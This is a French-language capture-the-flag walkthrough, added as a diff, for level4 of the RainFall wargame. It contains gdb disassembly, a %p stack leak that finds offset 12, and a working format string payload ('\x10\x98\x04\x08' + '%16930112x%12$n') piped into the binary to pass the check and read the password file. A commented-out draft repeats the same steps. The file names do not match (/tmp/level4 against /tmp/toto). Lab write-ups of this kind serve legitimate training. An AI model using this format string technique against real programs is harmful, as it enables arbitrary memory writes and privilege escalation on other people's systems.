@@ -1,0 +1,47 @@
+
+1. gdb level4 / info functio / disass main / disass n / disass p
+2. Il y a un printf dans p et un system dans n, on va donc utilise la technique de string attack
+4.    
+	0x08048492 <+59>:	cmp    eax,0x1025544
+   	0x08048497 <+64>:	jne    0x80484a5 <n+78>
+   	0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
+   	0x080484a0 <+73>:	call   0x8048360 <system@plt>
+
+   	eax est compare a 16930116, il va donc falloir modifer cette valeur presente a l'adresse 0x8048590
+5. level4@RainFall:~$ ./level4
+	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 0xb7ff26b0 0xbffff5f4 0xb7fd0ff4 (nil) (nil) 0xbffff5b8 0x804848d 0xbffff3b0 0x200 0xb7fd1ac0 0xb7ff37d0 [0x41414141] 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
+
+	l'offset est de 12.
+
+6. python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' > /tmp/level4
+	{
+		"\x10\x98\x04\x08" => l'adresse que l'on souhaite modifier
+		%16930112x -> le padding
+ 		"%12$n"' => l'offset
+	}
+7.  cat /tmp/toto - | ./level4
+
+
+
+
+<!-- 
+Il y a un printf on va donc faire un format string attack comme le precedent.
+
+Dans la function v on voit que eax est comparé a 16930116, si egal, l'exe lance un cat du .pass, il faut donc reussir a modifier la valeur contenu a l'addresse correspondant
+
+ 0x0804848d <+54>:	mov    eax,ds:0x8049810
+ 0x08048492 <+59>:	cmp    eax,0x1025544
+ 0x08048497 <+64>:	jne    0x80484a5 <n+78>
+
+ On va donc tenter de modifier la valeur stoké a l'adresse 0x8049810
+
+
+ python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' > /tmp/toto
+
+"\x10\x98\x04\x08" => l'adresse que l'on souhaite modifier
+%16930112x -> le padding
+ "%12$n"' => c'est l'offset (stack) auxquelle est l'addresse
+
+ cat /tmp/toto - | ./level4
+ -->
